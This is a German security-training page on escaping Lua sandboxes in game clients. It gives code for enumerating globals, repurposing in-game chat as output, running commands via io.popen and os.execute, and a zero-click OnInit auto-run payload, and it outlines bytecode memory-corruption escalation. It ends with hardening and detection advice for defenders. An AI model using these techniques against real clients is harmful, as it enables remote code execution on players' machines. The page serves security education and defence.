# Bypass Lua sandboxes (eingebettete VMs, Game-Clients)

{{#include ../../../banners/hacktricks-training.md}}

Diese Seite fasst praktische Techniken zusammen, um in Anwendungen eingebettete Lua-"sandboxes" (insbesondere in Game-Clients, Plugins oder In-App-Scripting-Engines) zu enumerieren und zu verlassen. Viele Engines stellen eine eingeschränkte Lua-Umgebung bereit, lassen jedoch mächtige erreichbare globale Variablen zurück, die beliebige Befehlsausführung oder sogar native Speicherbeschädigung ermöglichen, wenn Bytecode-Loader verfügbar sind.

Wichtige Ideen:
- Behandle die VM als unbekannte Umgebung: Enumeriere _G und finde heraus, welche gefährlichen Primitives erreichbar sind.
- Wenn stdout/print blockiert ist, missbrauche jeden UI-/IPC-Kanal innerhalb der VM als Ausgabesink, um Ergebnisse zu beobachten.
- Wenn io/os verfügbar ist, hast du häufig direkten Zugriff auf Befehlsausführung (io.popen, os.execute).
- Wenn load/loadstring/loadfile verfügbar sind, kann das Ausführen von speziell erstelltem Lua-Bytecode in einigen Versionen die Speichersicherheit unterlaufen (Verifier ≤5.1 sind umgehbar; 5.2 hat den Verifier entfernt), wodurch fortgeschrittene Exploitation ermöglicht wird.

## Die sandboxed Umgebung enumerieren

- Gib die globale Umgebung aus, um erreichbare Tabellen/Funktionen zu inventarisieren:
```lua
-- Minimal _G dumper for any Lua sandbox with some output primitive `out`
local function dump_globals(out)
out("=== DUMPING _G ===")
for k, v in pairs(_G) do
out(tostring(k) .. " = " .. tostring(v))
end
end
```
- Wenn kein print() verfügbar ist, zweckentfremde VM-interne Kanäle. Beispiel aus einer MMO-Housing-Script-VM, in der die Chat-Ausgabe erst nach einem Sound-Aufruf funktioniert; das Folgende erstellt eine zuverlässige Ausgabefunktion:<sup>[[1]](#references)</sup>
```lua
-- Build an output channel using in-game primitives
local function ButlerOut(label)
-- Some engines require enabling an audio channel before speaking
H.PlaySound(0, "r[1]") -- quirk: required before H.Say()
return function(msg)
H.Say(label or 1, msg)
end
end

function OnMenu(menuNum)
if menuNum ~= 3 then return end
local out = ButlerOut(1)
dump_globals(out)
end
```
Verallgemeinere dieses Muster für dein Ziel: Jede Textbox, jeder Toast, jeder Logger oder jeder UI callback, der Strings akzeptiert, kann als stdout für Reconnaissance dienen.

## Direct command execution, wenn io/os verfügbar ist

Wenn die Sandbox weiterhin die Standardbibliotheken io oder os bereitstellt, hast du wahrscheinlich sofort command execution:
```lua
-- Windows example
io.popen("calc.exe")

-- Cross-platform variants depending on exposure
os.execute("/usr/bin/id")
io.popen("/bin/sh -c 'id'")
```
Hinweise:

- Die Ausführung findet innerhalb des Client-Prozesses statt; viele Anti-Cheat-/Anti-Debug-Schichten, die externe Debugger blockieren, verhindern keine Prozesserstellung innerhalb der VM.
- Prüfe außerdem: `package.loadlib` (Laden beliebiger DLLs/.so-Dateien), `require` mit nativen Modulen, LuaJITs `ffi` (falls vorhanden) und die `debug`-Bibliothek (kann Berechtigungen innerhalb der VM erhöhen).

## Zero-click-Trigger über auto-run callbacks

Wenn die Host-Anwendung Scripts an Clients überträgt und die VM auto-run hooks (z. B. OnInit/OnLoad/OnEnter) bereitstellt, platziere dort deine Payload, um unmittelbar nach dem Laden des Scripts eine Drive-by-Kompromittierung auszulösen:<sup>[[1]](#references)</sup>
```lua
function OnInit()
io.popen("calc.exe") -- or any command
end
```
Jeder gleichwertige Callback (OnLoad, OnEnter usw.) verallgemeinert diese Technik, wenn Scripts automatisch an den Client übertragen und dort ausgeführt werden.

## Gefährliche Primitives, nach denen während der Recon gesucht werden sollte

Bei der _G-Aufzählung sollte speziell nach Folgendem gesucht werden:
- io, os: io.popen, os.execute, Datei-I/O, Zugriff auf Umgebungsvariablen.
- load, loadstring, loadfile, dofile: Ausführen von Quelltext oder Bytecode; unterstützt das Laden nicht vertrauenswürdigen Bytecodes.
- package, package.loadlib, require: Laden dynamischer Bibliotheken und Moduloberfläche.
- debug: setfenv/getfenv (≤5.1), getupvalue/setupvalue, getinfo und Hooks.
- Nur LuaJIT: ffi.cdef, ffi.load zum direkten Aufrufen nativen Codes.

Minimale Verwendungsbeispiele (falls erreichbar):
```lua
-- Execute source/bytecode
local f = load("return 1+1")
print(f()) -- 2

-- loadstring is alias of load for strings in 5.1
local bc = string.dump(function() return 0x1337 end)
local g = loadstring(bc) -- in 5.1 may run precompiled bytecode
print(g())

-- Load native library symbol (if allowed)
local mylib = package.loadlib("./libfoo.so", "luaopen_foo")
local foo = mylib()
```
## Optionale Eskalation: Missbrauch von Lua-Bytecode-Loadern

Wenn load/loadstring/loadfile erreichbar sind, io/os jedoch eingeschränkt sind, kann die Ausführung von manipuliertem Lua-Bytecode zu Speicher-Offenlegung und Speicher-Korruptionsprimitiven führen. Wichtige Fakten:
- Lua ≤ 5.1 enthielt einen Bytecode-Verifier, für den bekannte Bypasses existieren.<sup>[[4]](#references)</sup>
- Lua 5.2 entfernte den Verifier vollständig (offizielle Position: Anwendungen sollten einfach vorkompilierte Chunks ablehnen), wodurch sich die Angriffsfläche vergrößert, wenn das Laden von Bytecode nicht verboten ist.<sup>[[2]](#references)[[3]](#references)</sup>
- Typische Abläufe: Pointer über die In-VM-Ausgabe leaken, Bytecode erstellen, um Type Confusions zu erzeugen (z. B. im Zusammenhang mit FORLOOP oder anderen Opcodes), und anschließend zu beliebigem Lesen/Schreiben oder zur Ausführung von nativem Code pivotieren.<sup>[[2]](#references)[[4]](#references)</sup>

Dieser Pfad ist Engine-/versionsspezifisch und erfordert RE. Siehe die Referenzen für ausführliche Analysen, Exploitation-Primitiven und beispielhafte Gadgets in Games.

## Hinweise zur Erkennung und Härtung (für Defender)

- Serverseitig: User-Scripts ablehnen oder umschreiben; sichere APIs allowlisten; io, os, load/loadstring/loadfile/dofile, package.loadlib, debug und ffi entfernen oder an leere Implementierungen binden.
- Clientseitig: Lua mit einem minimalen _ENV ausführen, das Laden von Bytecode verbieten, einen strikten Bytecode-Verifier oder Signaturprüfungen wieder einführen und die Prozesserstellung aus dem Client-Prozess blockieren.
- Telemetrie: Auf die Erstellung von gameclient → Child-Prozess kurz nach dem Laden eines Scripts alarmieren; mit UI-/Chat-/Script-Events korrelieren.

## Referenzen

- [1] [Dieses Haus ist heimgesucht: Eine zehn Jahre alte RCE im AION-Client (Lua-VM für Housing)](https://appsec.space/posts/aion-housing-exploit/)
- [2] [Bytecode Breakdown: Entschlüsselung der Lua-Sicherheitslücken in Factorio](https://memorycorruption.net/posts/rce-lua-factorio/)
- [3] [lua-l (2009): Diskussion über die Abschaffung des Bytecode-Verifiers](https://web.archive.org/web/20230308193701/https://lua-users.org/lists/lua-l/2009-03/msg00039.html)
- [4] [Ausnutzung von Lua-5.1-Bytecode (gist mit Verifier-Bypasses/Notizen)](https://gist.github.com/ulidtko/51b8671260db79da64d193e41d7e7d16)

{{#include ../../../banners/hacktricks-training.md}}
